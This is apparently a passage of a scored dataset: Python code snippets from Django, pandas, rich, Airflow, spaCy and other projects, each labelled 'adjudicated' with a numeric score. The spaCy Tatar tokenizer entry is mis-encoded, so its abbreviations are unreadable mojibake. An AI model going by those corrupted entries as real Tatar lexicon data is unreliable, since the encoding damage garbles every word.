                if_statement = bool(self.if_statement.resolve(context))
            except template.VariableDoesNotExist:
                if_statement = False
        else:
            if_statement = True
        output = self.nodelist.render(context)
        if if_statement:
            indent = "" "" * indent_level
            output = indent + indent.join(output.splitlines(True))
        return output


@register.tag
def indentby(parser, token):
    """"""
    Add indentation to text between the tags by the given indentation level.

    {% indentby <indent_level> [if <statement>] %}
    ...
    {% endindentby %}

    Arguments:
      indent_level - Number of spaces to indent text with.
      statement - Only apply indent_level if the boolean statement evalutates to True.
    """"""
    args = token.split_contents()
    largs = len(args)
    if largs not in (2, 4):
        raise template.TemplateSyntaxError(""indentby tag requires 1 or 3 arguments"")
    indent_level = args[1]
    if_statement = None
    if largs == 4:
        if_statement = args[3]
    nodelist = parser.parse(('endindentby', ))
    parser.delete_first_token()
    return IndentByNode(nodelist, indent_level, if_statement)"
120	adjudicated	3	"from functools import wraps

from django.middleware.csrf import CsrfViewMiddleware, get_token
from django.utils.decorators import decorator_from_middleware

csrf_protect = decorator_from_middleware(CsrfViewMiddleware)
csrf_protect.__name__ = ""csrf_protect""
csrf_protect.__doc__ = """"""
This decorator adds CSRF protection in exactly the same way as
CsrfViewMiddleware, but it can be used on a per view basis.  Using both, or
using the decorator multiple times, is harmless and efficient.
""""""


class _EnsureCsrfToken(CsrfViewMiddleware):
    # Behave like CsrfViewMiddleware but don't reject requests or log warnings.
    def _reject(self, request, reason):
        return None


requires_csrf_token = decorator_from_middleware(_EnsureCsrfToken)
requires_csrf_token.__name__ = ""requires_csrf_token""
requires_csrf_token.__doc__ = """"""
Use this decorator on views that need a correct csrf_token available to
RequestContext, but without the CSRF protection that csrf_protect
enforces.
""""""


class _EnsureCsrfCookie(CsrfViewMiddleware):
    def _reject(self, request, reason):
        return None

    def process_view(self, request, callback, callback_args, callback_kwargs):
        retval = super().process_view(request, callback, callback_args, callback_kwargs)
        # Force process_response to send the cookie
        get_token(request)
        return retval


ensure_csrf_cookie = decorator_from_middleware(_EnsureCsrfCookie)
ensure_csrf_cookie.__name__ = ""ensure_csrf_cookie""
ensure_csrf_cookie.__doc__ = """"""
Use this decorator to ensure that a view sets a CSRF cookie, whether or not it
uses the csrf_token template tag, or the CsrfViewMiddleware is used.
""""""


def csrf_exempt(view_func):
    """"""Mark a view function as being exempt from the CSRF view protection.""""""

    # view_func.csrf_exempt = True would also work, but decorators are nicer
    # if they don't have side effects, so return a new function.
    def wrapped_view(*args, **kwargs):
        return view_func(*args, **kwargs)

    wrapped_view.csrf_exempt = True
    return wraps(view_func)(wrapped_view)"
60	adjudicated	4	"""""""
 This module houses ctypes interfaces for GDAL objects.  The following GDAL
 objects are supported:

 CoordTransform: Used for coordinate transformations from one spatial
  reference system to another.

 Driver: Wraps an OGR data source driver.

 DataSource: Wrapper for the OGR data source object, supports
  OGR-supported data sources.

 Envelope: A ctypes structure for bounding boxes (GDAL library
  not required).

 OGRGeometry: Object for accessing OGR Geometry functionality.

 OGRGeomType: A class for representing the different OGR Geometry
  types (GDAL library not required).

 SpatialReference: Represents OSR Spatial Reference objects.

 The GDAL library will be imported from the system path using the default
 library name for the current OS. The default library path may be overridden
 by setting `GDAL_LIBRARY_PATH` in your settings with the path to the GDAL C
 library on your system.
""""""
from django.contrib.gis.gdal.datasource import DataSource
from django.contrib.gis.gdal.driver import Driver
from django.contrib.gis.gdal.envelope import Envelope
from django.contrib.gis.gdal.error import GDALException, SRSException, check_err
from django.contrib.gis.gdal.geometries import OGRGeometry
from django.contrib.gis.gdal.geomtype import OGRGeomType
from django.contrib.gis.gdal.libgdal import (
    GDAL_VERSION,
    gdal_full_version,
    gdal_version,
)
from django.contrib.gis.gdal.raster.source import GDALRaster
from django.contrib.gis.gdal.srs import AxisOrder, CoordTransform, SpatialReference

__all__ = (
    ""AxisOrder"",
    ""Driver"",
    ""DataSource"",
    ""CoordTransform"",
    ""Envelope"",
    ""GDALException"",
    ""GDALRaster"",
    ""GDAL_VERSION"",
    ""OGRGeometry"",
    ""OGRGeomType"",
    ""SpatialReference"",
    ""SRSException"",
    ""check_err"",
    ""gdal_version"",
    ""gdal_full_version"",
)"
171	adjudicated	3	"# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and


# [START kms_create_key_labels]
def create_key_labels(project_id, location_id, key_ring_id, key_id):
    """"""
    Creates a new key in Cloud KMS with labels.

    Args:
        project_id (string): Google Cloud project ID (e.g. 'my-project').
        location_id (string): Cloud KMS location (e.g. 'us-east1').
        key_ring_id (string): ID of the Cloud KMS key ring (e.g. 'my-key-ring').
        key_id (string): ID of the key to create (e.g. 'my-labeled-key').

    Returns:
        CryptoKey: Cloud KMS key.

    """"""

    # Import the client library.
    from google.cloud import kms

    # Create the client.
    client = kms.KeyManagementServiceClient()

    # Build the parent key ring name.
    key_ring_name = client.key_ring_path(project_id, location_id, key_ring_id)

    # Build the key.
    purpose = kms.CryptoKey.CryptoKeyPurpose.ENCRYPT_DECRYPT
    algorithm = kms.CryptoKeyVersion.CryptoKeyVersionAlgorithm.GOOGLE_SYMMETRIC_ENCRYPTION
    key = {
        'purpose': purpose,
        'version_template': {
            'algorithm': algorithm,
        },
        'labels': {
            'team': 'alpha',
            'cost_center': 'cc1234'
        }
    }

    # Call the API.
    created_key = client.create_crypto_key(
        request={'parent': key_ring_name, 'crypto_key_id': key_id, 'crypto_key': key})
    print('Created labeled key: {}'.format(created_key.name))
    return created_key
# [END kms_create_key_labels]"
31	adjudicated	1	"from pathlib import Path

from django.dispatch import receiver
from django.template import engines
from django.template.backends.django import DjangoTemplates
from django.utils._os import to_path
from django.utils.autoreload import autoreload_started, file_changed, is_django_path


def get_template_directories():
    # Iterate through each template backend and find
    # any template_loader that has a 'get_dirs' method.
    # Collect the directories, filtering out Django templates.
    cwd = Path.cwd()
    items = set()
    for backend in engines.all():
        if not isinstance(backend, DjangoTemplates):
            continue

        items.update(cwd / to_path(dir) for dir in backend.engine.dirs if dir)

        for loader in backend.engine.template_loaders:
            if not hasattr(loader, ""get_dirs""):
                continue
            items.update(
                cwd / to_path(directory)
                for directory in loader.get_dirs()
                if directory and not is_django_path(directory)
            )
    return items


def reset_loaders():
    for backend in engines.all():
        if not isinstance(backend, DjangoTemplates):
            continue
        for loader in backend.engine.template_loaders:
            loader.reset()


@receiver(autoreload_started, dispatch_uid=""template_loaders_watch_changes"")
def watch_for_template_changes(sender, **kwargs):
    for directory in get_template_directories():
        sender.watch_dir(directory, ""**/*"")


@receiver(file_changed, dispatch_uid=""template_loaders_file_changed"")
def template_changed(sender, file_path, **kwargs):
    if file_path.suffix == "".py"":
        return
    for template_dir in get_template_directories():
        if template_dir in file_path.parents:
            reset_loaders()
            return True"
213	adjudicated	1	"import contextlib

import rope.base.oi.soi
import rope.base.pyobjects
from rope.base import pynames, utils


class DefinedName(pynames.DefinedName):
    pass


class AssignedName(pynames.AssignedName):
    def __init__(self, lineno=None, module=None, pyobject=None):
        self.lineno = lineno
        self.module = module
        self.assignments = []
        self.pyobject = _Inferred(
            self._get_inferred, pynames._get_concluded_data(module)
        )
        self.pyobject.set(pyobject)

    @utils.prevent_recursion(lambda: None)
    def _get_inferred(self):
        if self.module is not None:
            return rope.base.oi.soi.infer_assigned_object(self)

    def get_object(self):
        return self.pyobject.get()

    def get_definition_location(self):
        """"""Returns a (module, lineno) tuple""""""
        if self.lineno is None and self.assignments:
            with contextlib.suppress(AttributeError):
                self.lineno = self.assignments[0].get_lineno()
        return (self.module, self.lineno)

    def invalidate(self):
        """"""Forget the `PyObject` this `PyName` holds""""""
        self.pyobject.set(None)


class UnboundName(pynames.UnboundName):
    pass


class ParameterName(pynames.ParameterName):
    def __init__(self, pyfunction, index):
        self.pyfunction = pyfunction
        self.index = index

    def get_object(self):
        result = self.pyfunction.get_parameter(self.index)
        if result is None:
            result = rope.base.pyobjects.get_unknown()
        return result

    def get_objects(self):
        """"""Returns the list of objects passed as this parameter""""""
        return rope.base.oi.soi.get_passed_objects(self.pyfunction, self.index)

    def get_definition_location(self):
        return (self.pyfunction.get_module(), self.pyfunction.get_ast().lineno)


class AssignmentValue(pynames.AssignmentValue):
    pass


class EvaluatedName(pynames.EvaluatedName):
    pass


class ImportedModule(pynames.ImportedModule):
    pass


class ImportedName(pynames.ImportedName):
    pass


_Inferred = pynames._Inferred"
182	adjudicated	1	"# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.
""""""Kerberos command.""""""
from __future__ import annotations

import daemon
from daemon.pidfile import TimeoutPIDLockFile

from airflow import settings
from airflow.security import kerberos as krb
from airflow.utils import cli as cli_utils
from airflow.utils.cli import setup_locations


@cli_utils.action_cli
def kerberos(args):
    """"""Start a kerberos ticket renewer.""""""
    print(settings.HEADER)

    if args.daemon:
        pid, stdout, stderr, _ = setup_locations(
            ""kerberos"", args.pid, args.stdout, args.stderr, args.log_file
        )
        with open(stdout, ""a"") as stdout_handle, open(stderr, ""a"") as stderr_handle:
            stdout_handle.truncate(0)
            stderr_handle.truncate(0)

            ctx = daemon.DaemonContext(
                pidfile=TimeoutPIDLockFile(pid, -1),
                stdout=stdout_handle,
                stderr=stderr_handle,
                umask=int(settings.DAEMON_UMASK, 8),
            )

            with ctx:
                krb.run(principal=args.principal, keytab=args.keytab)
    else:
        krb.run(principal=args.principal, keytab=args.keytab)"
353	adjudicated	0	"import json
import os
import time
import random
from linkedin_api import Linkedin
from dotenv import load_dotenv
import sys

class Scrape():
    def __init__(self, api):
        self.api = api
        
    def read_json(self, filename='jobs.json'):
        with open(filename, 'r') as file:
            return json.load(file)

    def write_json(self, newData):
        with open('jobs.json', 'r+') as file:
            data = self.read_json()
            data['job-list'].append(newData)
            json.dump(data, file)

    def searchJobs(self, apiChosen, numberOfSearches, keywordChosen, offsetNumber):
        jobs = apiChosen.search_jobs(keywordChosen, remote = 1, limit = \
                            numberOfSearches, offset = offsetNumber)
        for job in jobs:
            title = job['title']
            jobID = job['dashEntityUrn'].split(':')[-1] 
            location = job['formattedLocation']
            #jobDetails = api.get_job(jobID)
            jobLink = f'https://www.linkedin.com/jobs/view/{jobID}/'
            job = {
                ""Job title"":title,
                ""Job link"":jobLink,
                ""Location"":location
            }
            print(f""{title} : {jobID} : {location}"")
            self.write_json(job)
        

    def findSWEJobs(self, apiChosen):
        listOfJobs = [""Software Developer"",""Software Engineer"", ""Software Intern"",""SDET"",""Developer Intern"",""Software co-op"",""Junior Developer""] 
        for i in range(11,101):
            
            for element in listOfJobs:
                self.searchJobs(apiChosen, 1, element, i)
                time.sleep(1*random.randint(1,5)+2)
    
if(__name__ == ""__main__""):
    load_dotenv()
    Password = os.getenv('PASSWORD')
    Email = os.getenv('EMAIL')
    api = Linkedin(Email, Password)
    data = {""job-list"": [{}]}
    with open('jobs.json', 'w') as file:
        json.dump(data, file)

    scraper = Scrape(api)
    scraper.findSWEJobs(api)
    
    "
242	adjudicated	0	"import re
from typing import Iterable, List, Tuple

from .cells import cell_len, chop_cells
from ._loop import loop_last

re_word = re.compile(r""\s*\S+\s*"")


def words(text: str) -> Iterable[Tuple[int, int, str]]:
    position = 0
    word_match = re_word.match(text, position)
    while word_match is not None:
        start, end = word_match.span()
        word = word_match.group(0)
        yield start, end, word
        word_match = re_word.match(text, end)


def divide_line(text: str, width: int, fold: bool = True) -> List[int]:
    divides: List[int] = []
    append = divides.append
    line_position = 0
    _cell_len = cell_len
    for start, _end, word in words(text):
        word_length = _cell_len(word.rstrip())
        if line_position + word_length > width:
            if word_length > width:
                if fold:
                    for last, line in loop_last(
                        chop_cells(word, width, position=line_position)
                    ):
                        if last:
                            line_position = _cell_len(line)
                        else:
                            start += len(line)
                            append(start)
                else:
                    if start:
                        append(start)
                    line_position = _cell_len(word)
            elif line_position and start:
                append(start)
                line_position = _cell_len(word)
        else:
            line_position += _cell_len(word)
    return divides


if __name__ == ""__main__"":  # pragma: no cover
    from .console import Console

    console = Console(width=10)
    console.print(""12345 abcdefghijklmnopqrstuvwyxzABCDEFGHIJKLMNOPQRSTUVWXYZ 12345"")
    print(chop_cells(""abcdefghijklmnopqrstuvwxyz"", 10, position=2))"
302	adjudicated	2	"from rx.core import Observable
from rx.internal import extensionmethod
import math


def determine_median(sorted_list):
    if len(sorted_list) == 0:
        raise Exception(""The input sequence was empty"")

    if len(sorted_list) % 2 == 1:
        return sorted_list[int((len(sorted_list) + 1) / 2) - 1]
    else:
        median_1 = sorted_list[int((len(sorted_list) + 1) / 2) - 1]
        median_2 = sorted_list[int((len(sorted_list) + 1) / 2)]
        return float(median_1 + median_2) / 2.0


@extensionmethod(Observable)
def median(self):
    """"""
    Calculates the statistical median on numerical emissions. The sequence must be finite.
    """"""
    return self.to_sorted_list().map(lambda l: determine_median(l))


@extensionmethod(Observable)
def mode(self):
    """"""
    Returns the most frequently emitted value (or ""values"" if they have the same number of occurrences).
    The sequence must be finite.
    """"""
    return self.group_by(lambda v: v) \
        .flat_map(lambda grp: grp.count().map(lambda ct: (grp.key, ct))) \
        .to_sorted_list(lambda t: t[1], reverse=True) \
        .flat_map(lambda l: Observable.from_(l).take_while(lambda t: t[1] == l[0][1])) \
        .map(lambda t: t[0])


@extensionmethod(Observable)
def variance(self):
    """"""
    Returns the statistical variance of the numerical emissions.
    The sequence must be finite.
    """"""
    squared_values = self.to_list() \
        .flat_map(lambda l: Observable.from_(l).average().flat_map(lambda avg: Observable.from_(l).map(lambda i: i - avg))) \
        .map(lambda i: i * i) \
        .publish() \
        .auto_connect(2)

    return Observable.zip(squared_values.sum(), squared_values.count(), lambda sum, ct: sum / (ct - 1))


@extensionmethod(Observable)
def standard_deviation(self):
    """"""
    Returns the standard deviation of the numerical emissions:
    The sequence must be finite.
    """"""
    return self.variance().map(lambda i: math.sqrt(i))

"
93	adjudicated	3	"import pytest

from pandas import TimedeltaIndex

from pandas.tseries.offsets import (
    DateOffset,
    Day,
    Hour,
)


class TestFreq:
    @pytest.mark.parametrize(""values"", [[""0 days"", ""2 days"", ""4 days""], []])
    @pytest.mark.parametrize(""freq"", [""2D"", Day(2), ""48H"", Hour(48)])
    def test_freq_setter(self, values, freq):
        # GH#20678
        idx = TimedeltaIndex(values)

        # can set to an offset, converting from string if necessary
        idx._data.freq = freq
        assert idx.freq == freq
        assert isinstance(idx.freq, DateOffset)

        # can reset to None
        idx._data.freq = None
        assert idx.freq is None

    def test_freq_setter_errors(self):
        # GH#20678
        idx = TimedeltaIndex([""0 days"", ""2 days"", ""4 days""])

        # setting with an incompatible freq
        msg = (
            ""Inferred frequency 2D from passed values does not conform to ""
            ""passed frequency 5D""
        )
        with pytest.raises(ValueError, match=msg):
            idx._data.freq = ""5D""

        # setting with a non-fixed frequency
        msg = r""<2 \* BusinessDays> is a non-fixed frequency""
        with pytest.raises(ValueError, match=msg):
            idx._data.freq = ""2B""

        # setting with non-freq string
        with pytest.raises(ValueError, match=""Invalid frequency""):
            idx._data.freq = ""foo""

    def test_freq_view_safe(self):
        # Setting the freq for one TimedeltaIndex shouldn't alter the freq
        #  for another that views the same data

        tdi = TimedeltaIndex([""0 days"", ""2 days"", ""4 days""], freq=""2D"")
        tda = tdi._data

        tdi2 = TimedeltaIndex(tda)._with_freq(None)
        assert tdi2.freq is None

        # Original was not altered
        assert tdi.freq == ""2D""
        assert tda.freq == ""2D"""
394	adjudicated	2	"import sys
from dataclasses import dataclass


@dataclass
class WindowsConsoleFeatures:
    """"""Windows features available.""""""

    vt: bool = False
    """"""The console supports VT codes.""""""
    truecolor: bool = False
    """"""The console supports truecolor.""""""


try:
    import ctypes
    from ctypes import LibraryLoader

    if sys.platform == ""win32"":
        windll = LibraryLoader(ctypes.WinDLL)
    else:
        windll = None
        raise ImportError(""Not windows"")

    from pip._vendor.rich._win32_console import (
        ENABLE_VIRTUAL_TERMINAL_PROCESSING,
        GetConsoleMode,
        GetStdHandle,
        LegacyWindowsError,
    )

except (AttributeError, ImportError, ValueError):

    # Fallback if we can't load the Windows DLL
    def get_windows_console_features() -> WindowsConsoleFeatures:
        features = WindowsConsoleFeatures()
        return features

else:

    def get_windows_console_features() -> WindowsConsoleFeatures:
        """"""Get windows console features.

        Returns:
            WindowsConsoleFeatures: An instance of WindowsConsoleFeatures.
        """"""
        handle = GetStdHandle()
        try:
            console_mode = GetConsoleMode(handle)
            success = True
        except LegacyWindowsError:
            console_mode = 0
            success = False
        vt = bool(success and console_mode & ENABLE_VIRTUAL_TERMINAL_PROCESSING)
        truecolor = False
        if vt:
            win_version = sys.getwindowsversion()
            truecolor = win_version.major > 10 or (
                win_version.major == 10 and win_version.build >= 15063
            )
        features = WindowsConsoleFeatures(vt=vt, truecolor=truecolor)
        return features


if __name__ == ""__main__"":
    import platform

    features = get_windows_console_features()
    from pip._vendor.rich import print

    print(f'platform=""{platform.system()}""')
    print(repr(features))"
5	adjudicated	1	"# coding: utf8
from __future__ import unicode_literals

from ...symbols import ORTH, LEMMA, NORM

_exc = {}

_abbrev_exc = [
    # Weekdays abbreviations
    {ORTH: ""Ð´Ñ"", LEMMA: ""Ð´Ò¯ÑÓÐ¼Ð±Ðµ""},
    {ORTH: ""ÑÑ"", LEMMA: ""ÑÐ¸ÑÓÐ¼Ð±Ðµ""},
    {ORTH: ""ÑÑ"", LEMMA: ""ÑÓÑÑÓÐ¼Ð±Ðµ""},
    {ORTH: ""Ð¿Ñ"", LEMMA: ""Ð¿ÓÐ½ÒÐµÑÓÐ¼Ð±Ðµ""},
    {ORTH: ""ÒÐ¼"", LEMMA: ""ÒÐ¾Ð¼Ð³Ð°""},
    {ORTH: ""ÑÐ±"", LEMMA: ""ÑÐ¸Ð¼Ð±Ó""},
    {ORTH: ""ÑÑ"", LEMMA: ""ÑÐºÑÓÐ¼Ð±Ðµ""},
    # Months abbreviations
    {ORTH: ""Ð³ÑÐ¹"", LEMMA: ""Ð³ÑÐ¹Ð½Ð²Ð°Ñ""},
    {ORTH: ""ÑÐµÐ²"", LEMMA: ""ÑÐµÐ²ÑÐ°Ð»Ñ""},
    {ORTH: ""Ð¼Ð°Ñ"", LEMMA: ""Ð¼Ð°ÑÑ""},
    {ORTH: ""Ð¼Ð°Ñ"", LEMMA: ""Ð¼Ð°ÑÑ""},
    {ORTH: ""Ð°Ð¿Ñ"", LEMMA: ""Ð°Ð¿ÑÐµÐ»Ñ""},
    {ORTH: ""Ð¸ÑÐ½"", LEMMA: ""Ð¸ÑÐ½Ñ""},
    {ORTH: ""Ð¸ÑÐ»"", LEMMA: ""Ð¸ÑÐ»Ñ""},
    {ORTH: ""Ð°Ð²Ð³"", LEMMA: ""Ð°Ð²Ð³ÑÑÑ""},
    {ORTH: ""ÑÐµÐ½"", LEMMA: ""ÑÐµÐ½ÑÑÐ±ÑÑ""},
    {ORTH: ""Ð¾ÐºÑ"", LEMMA: ""Ð¾ÐºÑÑÐ±ÑÑ""},
    {ORTH: ""Ð½Ð¾Ñ"", LEMMA: ""Ð½Ð¾ÑÐ±ÑÑ""},
    {ORTH: ""Ð´ÐµÐº"", LEMMA: ""Ð´ÐµÐºÐ°Ð±ÑÑ""},
    # Number abbreviations
    {ORTH: ""Ð¼Ð»ÑÐ´"", LEMMA: ""Ð¼Ð¸Ð»Ð»Ð¸Ð°ÑÐ´""},
    {ORTH: ""Ð¼Ð»Ð½"", LEMMA: ""Ð¼Ð¸Ð»Ð»Ð¸Ð¾Ð½""},
]

for abbr in _abbrev_exc:
    for orth in (abbr[ORTH], abbr[ORTH].capitalize(), abbr[ORTH].upper()):
        _exc[orth] = [{ORTH: orth, LEMMA: abbr[LEMMA], NORM: abbr[LEMMA]}]
        _exc[orth + "".""] = [{ORTH: orth + ""."", LEMMA: abbr[LEMMA], NORM: abbr[LEMMA]}]

for exc_data in [  # ""etc."" abbreviations
    {ORTH: ""Ò».Ð±.Ñ."", NORM: ""Ò»ÓÐ¼ Ð±Ð°ÑÐºÐ° ÑÑÐ½Ð´ÑÐ¹Ð»Ð°Ñ""},
    {ORTH: ""Ò».Ð±."", NORM: ""Ò»ÓÐ¼ Ð±Ð°ÑÐºÐ°""},
    {ORTH: ""Ð±.Ñ.Ðº."", NORM: ""Ð±ÐµÐ·Ð½ÐµÒ£ ÑÑÐ°Ð³Ð° ÐºÐ°Ð´ÓÑ""},
    {ORTH: ""Ð±.Ñ."", NORM: ""Ð±ÐµÐ·Ð½ÐµÒ£ ÑÑÐ°""},
]:
    exc_data[LEMMA] = exc_data[NORM]
    _exc[exc_data[ORTH]] = [exc_data]

TOKENIZER_EXCEPTIONS = _exc"
145	adjudicated	2	"from selenium.webdriver.common.keys import Keys
from .utils import shift

INITIAL_CELLS = ['print(""a"")', 'print(""b"")', 'print(""c"")']

def test_insert_cell(prefill_notebook):
    notebook = prefill_notebook(INITIAL_CELLS)

    notebook.to_command_mode()
    notebook.focus_cell(2)
    notebook.convert_cell_type(2, ""markdown"")
    
    # insert code cell above
    notebook.current_cell.send_keys(""a"")
    assert notebook.get_cell_contents(2) == """"
    assert notebook.get_cell_type(2) == ""code""
    assert len(notebook.cells) == 4
    
    # insert code cell below
    notebook.current_cell.send_keys(""b"")
    assert notebook.get_cell_contents(2) == """"
    assert notebook.get_cell_contents(3) == """"
    assert notebook.get_cell_type(3) == ""code""
    assert len(notebook.cells) == 5

    notebook.edit_cell(index=1, content=""cell1"")
    notebook.focus_cell(1)
    notebook.current_cell.send_keys(""a"")
    assert notebook.get_cell_contents(1) == """"
    assert notebook.get_cell_contents(2) == ""cell1""

    notebook.edit_cell(index=1, content='cell1')
    notebook.edit_cell(index=2, content='cell2')
    notebook.edit_cell(index=3, content='cell3')
    notebook.focus_cell(2)
    notebook.current_cell.send_keys(""b"")
    assert notebook.get_cell_contents(1) == ""cell1""
    assert notebook.get_cell_contents(2) == ""cell2""
    assert notebook.get_cell_contents(3) == """"
    assert notebook.get_cell_contents(4) == ""cell3""

    # insert above multiple selected cells
    notebook.focus_cell(1)
    shift(notebook.browser, Keys.DOWN)
    notebook.current_cell.send_keys('a')
    
    # insert below multiple selected cells
    notebook.focus_cell(2)
    shift(notebook.browser, Keys.DOWN)
    notebook.current_cell.send_keys('b')
    assert notebook.get_cells_contents()[1:5] == ["""", ""cell1"", ""cell2"", """"]"
54	adjudicated	1	"import numpy as np
import pytest

import pandas.util._test_decorators as td

from pandas import DataFrame
import pandas._testing as tm


class TestCopy:
    @pytest.mark.parametrize(""attr"", [""index"", ""columns""])
    def test_copy_index_name_checking(self, float_frame, attr):
        # don't want to be able to modify the index stored elsewhere after
        # making a copy
        ind = getattr(float_frame, attr)
        ind.name = None
        cp = float_frame.copy()
        getattr(cp, attr).name = ""foo""
        assert getattr(float_frame, attr).name is None

    def test_copy_cache(self):
        # GH#31784 _item_cache not cleared on copy causes incorrect reads after updates
        df = DataFrame({""a"": [1]})

        df[""x""] = [0]
        df[""a""]

        df.copy()

        df[""a""].values[0] = -1

        tm.assert_frame_equal(df, DataFrame({""a"": [-1], ""x"": [0]}))

        df[""y""] = [0]

        assert df[""a""].values[0] == -1
        tm.assert_frame_equal(df, DataFrame({""a"": [-1], ""x"": [0], ""y"": [0]}))

    def test_copy(self, float_frame, float_string_frame):
        cop = float_frame.copy()
        cop[""E""] = cop[""A""]
        assert ""E"" not in float_frame

        # copy objects
        copy = float_string_frame.copy()
        assert copy._mgr is not float_string_frame._mgr

    @td.skip_array_manager_invalid_test
    def test_copy_consolidates(self):
        # GH#42477
        df = DataFrame(
            {
                ""a"": np.random.randint(0, 100, size=55),
                ""b"": np.random.randint(0, 100, size=55),
            }
        )

        for i in range(0, 10):
            df.loc[:, f""n_{i}""] = np.random.randint(0, 100, size=55)

        assert len(df._mgr.blocks) == 11
        result = df.copy()
        assert len(result._mgr.blocks) == 1"
285	adjudicated	1	"import sys


def patch_sys_module():

    def patched_exc_info(fun):

        def pydev_debugger_exc_info():
            type, value, traceback = fun()
            if type == ImportError:
                # we should not show frame added by plugin_import call
                if traceback and hasattr(traceback, ""tb_next""):
                    return type, value, traceback.tb_next
            return type, value, traceback

        return pydev_debugger_exc_info

    system_exc_info = sys.exc_info
    sys.exc_info = patched_exc_info(system_exc_info)
    if not hasattr(sys, ""system_exc_info""):
        sys.system_exc_info = system_exc_info


def patched_reload(orig_reload):

    def pydev_debugger_reload(module):
        orig_reload(module)
        if module.__name__ == ""sys"":
            # if sys module was reloaded we should patch it again
            patch_sys_module()

    return pydev_debugger_reload


def patch_reload():
    import builtins  # Py3

    if hasattr(builtins, ""reload""):
        sys.builtin_orig_reload = builtins.reload
        builtins.reload = patched_reload(sys.builtin_orig_reload)  # @UndefinedVariable
        try:
            import imp
            sys.imp_orig_reload = imp.reload
            imp.reload = patched_reload(sys.imp_orig_reload)  # @UndefinedVariable
        except:
            pass
    else:
        try:
            import importlib
            sys.importlib_orig_reload = importlib.reload  # @UndefinedVariable
            importlib.reload = patched_reload(sys.importlib_orig_reload)  # @UndefinedVariable
        except:
            pass

    del builtins


def cancel_patches_in_sys_module():
    sys.exc_info = sys.system_exc_info  # @UndefinedVariable
    import builtins  # Py3

    if hasattr(sys, ""builtin_orig_reload""):
        builtins.reload = sys.builtin_orig_reload

    if hasattr(sys, ""imp_orig_reload""):
        import imp
        imp.reload = sys.imp_orig_reload

    if hasattr(sys, ""importlib_orig_reload""):
        import importlib
        importlib.reload = sys.importlib_orig_reload

    del builtins"
114	adjudicated	2	"import _plotly_utils.basevalidators


class FontValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""font"", parent_name=""ohlc.hoverlabel"", **kwargs):
        super(FontValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Font""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            color

            colorsrc
                Sets the source reference on Chart Studio Cloud
                for `color`.
            family
                HTML font family - the typeface that will be
                applied by the web browser. The web browser
                will only be able to apply a font if it is
                available on the system which it operates.
                Provide multiple font families, separated by
                commas, to indicate the preference in which to
                apply fonts if they aren't available on the
                system. The Chart Studio Cloud (at
                https://chart-studio.plotly.com or on-premise)
                generates images on a server, where only a
                select number of fonts are installed and
                supported. These include ""Arial"", ""Balto"",
                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",
                ""Droid Sans Mono"", ""Gravitas One"", ""Old
                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans
                Narrow"", ""Raleway"", ""Times New Roman"".
            familysrc
                Sets the source reference on Chart Studio Cloud
                for `family`.
            size

            sizesrc
                Sets the source reference on Chart Studio Cloud
                for `size`.
"""""",
            ),
            **kwargs,
        )"
336	adjudicated	2	"from fontTools.pens.basePen import BasePen
from reportlab.graphics.shapes import Path


__all__ = [""ReportLabPen""]


class ReportLabPen(BasePen):

    """"""A pen for drawing onto a ``reportlab.graphics.shapes.Path`` object.""""""

    def __init__(self, glyphSet, path=None):
        BasePen.__init__(self, glyphSet)
        if path is None:
            path = Path()
        self.path = path

    def _moveTo(self, p):
        (x, y) = p
        self.path.moveTo(x, y)

    def _lineTo(self, p):
        (x, y) = p
        self.path.lineTo(x, y)

    def _curveToOne(self, p1, p2, p3):
        (x1, y1) = p1
        (x2, y2) = p2
        (x3, y3) = p3
        self.path.curveTo(x1, y1, x2, y2, x3, y3)

    def _closePath(self):
        self.path.closePath()


if __name__ == ""__main__"":
    import sys

    if len(sys.argv) < 3:
        print(
            ""Usage: reportLabPen.py <OTF/TTF font> <glyphname> [<image file to create>]""
        )
        print(
            ""  If no image file name is created, by default <glyphname>.png is created.""
        )
        print(""  example: reportLabPen.py Arial.TTF R test.png"")
        print(
            ""  (The file format will be PNG, regardless of the image file name supplied)""
        )
        sys.exit(0)

    from fontTools.ttLib import TTFont
    from reportlab.lib import colors

    path = sys.argv[1]
    glyphName = sys.argv[2]
    if len(sys.argv) > 3:
        imageFile = sys.argv[3]
    else:
        imageFile = ""%s.png"" % glyphName

    font = TTFont(path)  # it would work just as well with fontTools.t1Lib.T1Font
    gs = font.getGlyphSet()
    pen = ReportLabPen(gs, Path(fillColor=colors.red, strokeWidth=5))
    g = gs[glyphName]
    g.draw(pen)

    w, h = g.width, 1000
    from reportlab.graphics import renderPM
    from reportlab.graphics.shapes import Group, Drawing, scale

    # Everything is wrapped in a group to allow transformations.
    g = Group(pen.path)
    g.translate(0, 200)
    g.scale(0.3, 0.3)

    d = Drawing(w, h)
    d.add(g)

    renderPM.drawToFile(d, imageFile, fmt=""PNG"")"
276	adjudicated	4	"# Kills a process by process name
#
# Uses the Performance Data Helper to locate the PID, then kills it.
# Will only kill the process if there is only one process of that name
# (eg, attempting to kill ""Python.exe"" will only work if there is only
# one Python.exe running.  (Note that the current process does not
# count - ie, if Python.exe is hosting this script, you can still kill
# another Python.exe (as long as there is only one other Python.exe)

# Really just a demo for the win32pdh(util) module, which allows you
# to get all sorts of information about a running process and many
# other aspects of your system.

import win32api, win32pdhutil, win32con, sys


def killProcName(procname):
